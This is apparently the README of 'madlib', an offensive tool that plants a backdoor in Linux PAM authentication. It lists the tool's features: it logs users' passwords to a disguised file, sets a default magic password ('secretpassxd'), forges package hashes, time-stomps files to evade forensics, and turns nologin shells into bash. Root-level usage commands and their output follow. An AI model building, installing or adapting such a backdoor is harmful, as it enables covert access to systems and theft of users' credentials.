# madlib
PAM Backdoor, 
* Logs username/passwords to file
* Obfuscates backdoor password with bcrypt (helps make reverse engineering more difficult and string dumps less effective)
* Automatically updates the MD5 hashes, in DPKG
* Time stomps all replaced files
* Requires Python3
* Replaces /bin/false, and /bin/nologin with /bin/bash (effectively making any user able to ssh in)
* Username/passwords by default are logged to /usr/include/type.h
* The default magic password is secretpassxd


## Usage

Manually Specifying PAM Version:

```
root@homebase /h/r/madlib# ./pam.py "1.3.0"
                    .___.__  ._____.
  _____ _____     __| _/|  | |__\_ |__
 /     \\__  \   / __ | |  | |  || __ \
|  Y Y  \/ __ \_/ /_/ | |  |_|  || \_\ \
|__|_|  (____  /\____ | |____/__||___  /
      \/     \/      \/              \/
    https://github.com/rek7/madlib/
[00:15:55] [+] PAM TAR Download Completed
[00:15:56] [+] Finishing Extracting
[00:15:56] [+] Added Backdoor
[00:16:16] [+] Finished Compiling Tainted Lib
[00:16:16] [+] Finished Successfully
```

Automatic Version Detection:

```
root@homebase /h/r/madlib# ./pam.py
                    .___.__  ._____.
  _____ _____     __| _/|  | |__\_ |__
 /     \\__  \   / __ | |  | |  || __ \
|  Y Y  \/ __ \_/ /_/ | |  |_|  || \_\ \
|__|_|  (____  /\____ | |____/__||___  /
      \/     \/      \/              \/
    https://github.com/rek7/madlib/
[00:17:55] [!] Detected PAM Version: '1.3.0'
[00:17:55] [+] PAM TAR Download Completed
[00:17:56] [+] Finishing Extracting
[00:17:56] [+] Added Backdoor
[00:18:16] [+] Finished Compiling Tainted Lib
[00:18:16] [+] Finished Successfully
```
